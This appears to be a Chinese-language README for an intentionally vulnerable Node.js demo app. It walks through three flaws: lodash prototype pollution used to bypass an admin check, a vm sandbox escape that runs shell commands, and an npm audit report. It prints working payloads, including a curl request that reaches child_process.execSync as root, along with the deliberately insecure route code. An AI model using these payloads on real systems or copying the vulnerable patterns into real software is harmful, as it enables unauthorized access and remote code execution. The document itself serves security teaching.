# 经典Node.js漏洞演示

这个故意设置漏洞的应用程序演示了Node.js中的三个经典漏洞：

- 原型污染
- 沙箱逃逸
- 存在漏洞的第三方包（引入原型污染漏洞）

## 如何设置

使用 docker:

```
$ docker compose up
```

使用本地环境:

```
$ npm i && npm start
```

然后访问 http://localhost:9999/

## 漏洞演示

### 原型污染

```javascript
  app.post('/api/orders', validate(postOrderSchema), (req, res, next) => {
    const clientOrder = _.merge({}, req.body, { ipAddress: req.ip });

    const newObj = {};
    console.log('newObj.admin', newObj.admin);

    res.json({
      status: 'ok',
    });
  });
```

第三方包“lodash”已过时且在`merge`函数中容易受到原型污染漏洞的影响。

正常请求：

```bash
$ curl -H"content-type: application/json" -d @normal_order.json http://localhost:9999/api/orders

{"status":"ok"}
```

攻击请求：

```bash
$ curl -H"content-type: application/json" -d @attack_order.json http://localhost:9999/api/orders

{"status":"ok"}
```

`attack_order.json`包含原型污染有效载荷：

```json
{
  "__proto__": { "admin": true },
  "currency": "EUR",
  "email": "john.doe@mail.com"
}
```

它试图污染`Object.prototype`并向其中添加一个名为`admin`的属性，这将影响下面定义的`/api/login`路由：

```javascript
  function login(username, password) {
    if (username == 'admin' && password == 'thisisaveryveryverylongpassword') {
      return { user: 'admin', admin: true };
    } else {
      return { user: 'guest' };
    }
  }

  const loginSchema = {
    body: Joi.object({
      username: Joi.string().required(),
      password: Joi.string().required(),
    }),
  };
  app.post('/api/login', validate(loginSchema), (req, res, next) => {
    user = login(req.body.username, req.body.password);
    if (user.admin) {
      res.json({
        secret: "this is a top secret",
      });
    } else {
      res.json({
        error: "not admin"
      });
    }
  });
```

只有当用户输入正确的管理员用户名和密码时，`login`函数才会返回一个将'admin'属性设置为true的对象，否则，`login`函数将返回一个没有admin属性的对象。



在攻击者污染`Object.prototype`之前，它工作正常：

```bash
$ curl -H"content-type: application/json" -d'{"username":"admin","password":"idontknowpassword"}' http://localhost:9999/api/login

{"error":"not admin"}

----------------

$ curl -H"content-type: application/json" -d'{"username":"admin","password":"thisisaveryveryverylongpassword"}' http://localhost:9999/api/login

{"secret":"this is a top secret"}
```

在攻击者发送攻击请求并污染了`Object.prototype`之后，他可以在不知道管理员密码的情况下获得管理员权限：

```bash
$ curl -H"content-type: application/json" -d'{"username":"admin","password":"idontknowpassword"}' http://localhost:9999/api/login

{"secret":"this is a top secret"}
```

这是因为在`/api/login`路由中，它会检查`user.admin`，当找不到admin属性时，它会向上搜索到`__proto__`，也就是`Object.prototype`，并找到污染的admin属性。

###  沙箱逃逸

还有一个位于`/api/calc`的路由，用于执行一些简单的数学计算：

```javascript
  const mathExp = {
    body: Joi.object({
      exp: Joi.string().required(),
    }),
  };
  app.post('/api/calc', validate(mathExp), (req, res, next) => {
    console.log(req.body.exp);
    ans = vm.runInNewContext(req.body.exp);

    res.json({
      ans: ans,
    });
  });
```

```bash
curl -H"content-type: application/json" -d'{"exp":"2+3*4"}' http://localhost:9999/api/calc

{"ans":14}
```

它试图使用`vm`模块来评估来自客户端的表达式，这并不安全，可能被绕过并实现远程代码执行：

```bash
$ curl -H"content-type: application/json" -d $'{\"exp\":\"(e=> { return this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'id\').toString();})()\"}' http://localhost:9999/api/calc

{"ans":"uid=0(root) gid=0(root)\n"}
```

### 存在漏洞的第三方包

如原型污染漏洞中所示，`lodash`包已过时且容易受到原型污染的影响，我们可以使用`npm audit`命令来识别此问题：

```bash
$ npm audit
# npm audit report

lodash  <=4.17.20
Severity: critical
Regular Expression Denial of Service (ReDoS) in lodash - https://github.com/advisories/GHSA-x5rq-j2xg-h7qm
Prototype Pollution in lodash - https://github.com/advisories/GHSA-4xc9-xhrj-v574
Prototype Pollution in lodash - https://github.com/advisories/GHSA-fvqr-27wr-82fm
Prototype Pollution in lodash - https://github.com/advisories/GHSA-p6mc-m468-83gw
Command Injection in lodash - https://github.com/advisories/GHSA-35jh-r3h4-6jhm
Regular Expression Denial of Service (ReDoS) in lodash - https://github.com/advisories/GHSA-29mw-wpgm-hmr9
Prototype Pollution in lodash - https://github.com/advisories/GHSA-jf85-cpcp-j695
fix available via `npm audit fix --force`
Will install lodash@4.17.21, which is outside the stated dependency range
node_modules/express-validation/node_modules/lodash
node_modules/lodash

qs  6.7.0 - 6.7.2
Severity: high
qs vulnerable to Prototype Pollution - https://github.com/advisories/GHSA-hrpp-h998-j3pp
fix available via `npm audit fix`
node_modules/qs
  body-parser  1.19.0
  Depends on vulnerable versions of qs
  node_modules/body-parser
  express  4.17.0 - 4.17.1 || 5.0.0-alpha.1 - 5.0.0-alpha.8
  Depends on vulnerable versions of body-parser
  Depends on vulnerable versions of qs
  node_modules/express

4 vulnerabilities (3 high, 1 critical)

To address issues that do not require attention, run:
  npm audit fix

To address all issues, run:
  npm audit fix --force
```

然后，你可以分析报告并更新受影响的包以解决问题。
